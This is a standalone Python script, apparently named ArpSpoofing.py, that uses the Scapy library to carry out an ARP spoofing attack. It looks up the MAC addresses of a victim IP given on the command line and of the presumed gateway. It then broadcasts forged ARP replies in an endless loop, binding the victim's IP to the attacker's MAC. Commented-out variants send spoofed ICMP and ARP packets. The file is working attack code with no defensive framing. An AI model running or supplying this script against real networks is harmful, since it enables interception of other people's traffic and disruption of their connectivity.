#!/usr/bin/python3

#running command: python ArpSpoofing.py victimIP

import sys  #for command line argument
import time
import os
import shutil
import tempfile
from random import randint
from scapy.all import *
from scapy.layers.inet import *
import scapy
import socket
import uuid 

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP


my_ip = get_ip()

my_mac = str(':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) 
for ele in range(0,8*6,8)][::-1])) 

victim_ip = sys.argv[1]

# victim_ip = "192.168.0.106"	#for testing


network_parts = str(victim_ip).split(".")
gateway = network_parts[0]+ "."+network_parts[1]+ "."+network_parts[2]+ ".1" 

broadcastNet = network_parts[0]+ "."+network_parts[1]+ "."+network_parts[2]+ ".255" 

# print(str(my_ip) + " " + str(victim_ip) + " " + gateway)


arp_packet = ARP(op=ARP.who_has, psrc=my_ip, pdst=victim_ip)
result = sr1(arp_packet)
victim_mac = result[ARP].hwsrc


arp_packet = ARP(op=ARP.who_has, psrc=my_ip, pdst=gateway)
result = sr1(arp_packet)
gateway_mac = result[ARP].hwsrc


#######################################################################################################################


reply = ARP(op=ARP.is_at, hwsrc=my_mac, psrc=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", pdst=broadcastNet)
go = Ether(dst="ff:ff:ff:ff:ff:ff", src=my_mac) / reply

# send(go, verbose = 2, loop = 1)

while  1:
    sendp(go, verbose = 2)

    # time.sleep(randint(1, 3))



#######################################################################################################################

# ip_packet = IP(ttl=64)
# ip_packet.dst = gateway
# ip_packet.src = victim_ip

# icmp_packet = ip_packet/ICMP()/"Hello World"

# send(icmp_packet, verbose = 2, loop = 1)

# while 1:
	# send(ARP(op=ARP.is_at, psrc=victim_ip, hwdst="255.255.255.255", pdst="192.168.0.255"), verbose = 2)

	
